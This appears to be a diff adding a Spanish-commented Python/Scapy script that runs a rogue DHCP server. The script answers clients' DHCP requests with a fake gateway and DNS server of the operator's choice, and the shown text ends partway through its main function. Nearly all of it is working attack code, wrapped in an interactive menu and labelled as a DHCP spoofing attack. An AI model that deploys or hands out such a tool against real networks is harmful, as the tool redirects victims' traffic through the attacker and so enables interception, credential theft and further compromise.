@@ -1,0 +1,245 @@
+#!/usr/bin/env python3
+
+from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sniff, sendp
+from scapy.arch import get_if_hwaddr
+import ipaddress
+import sys
+import os
+
+
+def verificar_root():
+    if os.geteuid() != 0:
+        print("[!] Requiere root. Usa: sudo python3 dhcp_spoofing.py")
+        sys.exit(1)
+
+
+class ServidorDHCPFalso:
+    def __init__(self, interfaz, ip_servidor, gateway_falso, dns_falso, mascara, ip_inicio, total_ips):
+        self.interfaz      = interfaz
+        self.ip_servidor   = ip_servidor
+        self.gateway_falso = gateway_falso
+        self.dns_falso     = dns_falso
+        self.mascara       = mascara
+
+        try:
+            self.mac_propia = get_if_hwaddr(interfaz)
+        except Exception:
+            print(f"[!] No se pudo obtener la MAC de '{interfaz}'.")
+            sys.exit(1)
+
+        self.pool         = self._generar_pool(ip_inicio, total_ips)
+        self.asignaciones = {}
+        self.pendientes   = {}
+
+        print(f"[+] MAC del servidor falso : {self.mac_propia}")
+        print(f"[+] Pool generado          : {ip_inicio} -> {self.pool[-1] if self.pool else 'N/A'}")
+        print(f"[+] Total IPs disponibles  : {len(self.pool)}")
+
+    def _generar_pool(self, ip_inicio, cantidad):
+        pool = []
+        try:
+            base = ipaddress.IPv4Address(ip_inicio)
+            for offset in range(cantidad):
+                pool.append(str(base + offset))
+        except Exception as e:
+            print(f"[!] Error generando pool: {e}")
+        return pool
+
+    def _siguiente_ip(self, mac):
+        if mac in self.asignaciones:
+            return self.asignaciones[mac]
+        if mac in self.pendientes:
+            return self.pendientes[mac]
+        if self.pool:
+            ip = self.pool.pop(0)
+            self.pendientes[mac] = ip
+            return ip
+        return None
+
+    def _confirmar(self, mac):
+        if mac in self.pendientes:
+            self.asignaciones[mac] = self.pendientes.pop(mac)
+
+    def _opciones_dhcp(self, tipo):
+        return [
+            ("message-type", tipo),
+            ("server_id",    self.ip_servidor),
+            ("lease_time",   86400),
+            ("renewal_time", 43200),
+            ("rebinding_time", 64800),
+            ("subnet_mask",  self.mascara),
+            ("router",       self.gateway_falso),
+            ("name_server",  self.dns_falso),
+            "end"
+        ]
+
+    def _enviar_offer(self, pkt):
+        try:
+            mac_cliente = pkt[Ether].src
+            xid         = pkt[BOOTP].xid
+            ip_ofrecida = self._siguiente_ip(mac_cliente)
+
+            if not ip_ofrecida:
+                print("[!] Pool agotado.")
+                return
+
+            print(f"  [OFFER] -> IP: {ip_ofrecida} | Cliente: {mac_cliente}")
+            mac_bytes = bytes(int(x, 16) for x in mac_cliente.split(":"))
+
+            respuesta = (
+                Ether(src=self.mac_propia, dst=mac_cliente) /
+                IP(src=self.ip_servidor, dst="255.255.255.255") /
+                UDP(sport=67, dport=68) /
+                BOOTP(op=2, xid=xid, yiaddr=ip_ofrecida,
+                      siaddr=self.ip_servidor, giaddr="0.0.0.0",
+                      chaddr=mac_bytes + b'\x00' * 10) /
+                DHCP(options=self._opciones_dhcp("offer"))
+            )
+            sendp(respuesta, iface=self.interfaz, verbose=False)
+
+        except Exception as e:
+            print(f"[!] Error enviando OFFER: {e}")
+
+    def _enviar_ack(self, pkt):
+        try:
+            mac_cliente = pkt[Ether].src
+            xid         = pkt[BOOTP].xid
+            self._confirmar(mac_cliente)
+            ip_asignada = self.asignaciones.get(mac_cliente)
+
+            if not ip_asignada:
+                print(f"[!] No hay IP para {mac_cliente}.")
+                return
+
+            print(f"  [ACK]   -> IP: {ip_asignada} | Cliente: {mac_cliente}")
+            print(f"            Gateway: {self.gateway_falso} | DNS: {self.dns_falso}")
+            mac_bytes = bytes(int(x, 16) for x in mac_cliente.split(":"))
+
+            respuesta = (
+                Ether(src=self.mac_propia, dst=mac_cliente) /
+                IP(src=self.ip_servidor, dst="255.255.255.255") /
+                UDP(sport=67, dport=68) /
+                BOOTP(op=2, xid=xid, yiaddr=ip_asignada,
+                      siaddr=self.ip_servidor, giaddr="0.0.0.0",
+                      chaddr=mac_bytes + b'\x00' * 10) /
+                DHCP(options=self._opciones_dhcp("ack"))
+            )
+            sendp(respuesta, iface=self.interfaz, verbose=False)
+
+        except Exception as e:
+            print(f"[!] Error enviando ACK: {e}")
+
+    def _procesar_release(self, mac_cliente):
+        if mac_cliente in self.asignaciones:
+            ip_liberada = self.asignaciones.pop(mac_cliente)
+            self.pool.append(ip_liberada)
+            print(f"  [RELEASE] <- IP {ip_liberada} devuelta al pool")
+
+    def procesar(self, pkt):
+        if DHCP not in pkt:
+            return
+        try:
+            opciones = {opt[0]: opt[1] for opt in pkt[DHCP].options if isinstance(opt, tuple)}
+            tipo     = opciones.get("message-type")
+            mac      = pkt[Ether].src
+
+            if tipo == 1:
+                print(f"\n[DISCOVER] <- Solicitud de: {mac}")
+                self._enviar_offer(pkt)
+            elif tipo == 3:
+                ip_sol = opciones.get("requested_addr", "N/A")
+                print(f"  [REQUEST] <- IP solicitada: {ip_sol} | Cliente: {mac}")
+                self._enviar_ack(pkt)
+            elif tipo == 7:
+                self._procesar_release(mac)
+
+        except Exception as e:
+            print(f"[!] Error procesando paquete: {e}")
+
+    def iniciar(self):
+        print()
+        print("[*] Servidor DHCP falso activo. Escuchando... (Ctrl+C para detener)")
+        print()
+        try:
+            sniff(iface=self.interfaz,
+                  filter="udp and (port 67 or port 68)",
+                  prn=self.procesar, store=False)
+        except KeyboardInterrupt:
+            print("\n" + "=" * 55)
+            print("[*] Servidor detenido.")
+            print(f"[*] IPs asignadas : {len(self.asignaciones)}")
+            print(f"[*] IPs libres    : {len(self.pool)}")
+            if self.asignaciones:
+                print("\n[*] Tabla de asignaciones:")
+                for mac, ip in self.asignaciones.items():
+                    print(f"    {ip}  <-  {mac}")
+
+
+def validar_ip(ip):
+    try:
+        ipaddress.IPv4Address(ip)
+        return True
+    except Exception:
+        return False
+
+
+def menu():
+    print("=" * 55)
+    print("   ATAQUE DHCP SPOOFING - SERVIDOR DHCP FALSO")
+    print("=" * 55)
+    print()
+
+    interfaz = input("[?] Interfaz de red (ej: eth0)               : ").strip() or "eth0"
+
+    ip_servidor = input("[?] IP de este servidor falso (ej: 6.6.1.200) : ").strip()
+    if not validar_ip(ip_servidor):
+        print("[!] IP invalida."); sys.exit(1)
+
+    gateway_falso = input("[?] Gateway falso a anunciar  (ej: 6.6.1.200) : ").strip()
+    if not validar_ip(gateway_falso):
+        print("[!] IP invalida."); sys.exit(1)
+
+    dns_falso = input("[?] DNS falso a anunciar      (ej: 8.8.8.8)    : ").strip() or "8.8.8.8"
+    if not validar_ip(dns_falso):
+        print("[!] IP invalida."); sys.exit(1)
+
+    mascara = input("[?] Mascara de subred         [255.255.255.0]  : ").strip() or "255.255.255.0"
+
+    ip_inicio = input("[?] Primera IP del pool       (ej: 6.6.1.100)  : ").strip()
+    if not validar_ip(ip_inicio):
+        print("[!] IP invalida."); sys.exit(1)
+
+    while True:
+        try:
+            total_ips = int(input("[?] Cantidad de IPs en el pool [50]           : ").strip() or "50")
+            if total_ips > 0:
+                break
+            print("[!] Debe ser mayor a 0.")
+        except ValueError:
+            print("[!] Ingresa un numero valido.")
+
+    return interfaz, ip_servidor, gateway_falso, dns_falso, mascara, ip_inicio, total_ips
+
+
+def main():
+    verificar_root()
+    interfaz, ip_servidor, gateway_falso, dns_falso, mascara, ip_inicio, total_ips = menu()
+
+    print()
+    confirmar = input("[?] Iniciar servidor DHCP falso? (s/n): ").strip().lower()
+    if confirmar != "s":
+        print("[*] Cancelado.")
+        sys.exit(0)
+
+    print()
+    print("=" * 55)
+    print(f"[*] Interfaz          : {interfaz}")
+    print(f"[*] IP servidor falso : {ip_servidor}")
+    print(f"[*] Gateway falso     : {gateway_falso}")
+    print(f"[*] DNS falso         : {dns_falso}")
+    print(f"[*] Mascara           : {mascara}")
+    print("=" * 55)
+
+    servidor = ServidorDHCPFalso(
+        interfaz=interfaz,
+        ip_servidor=ip_servidor,
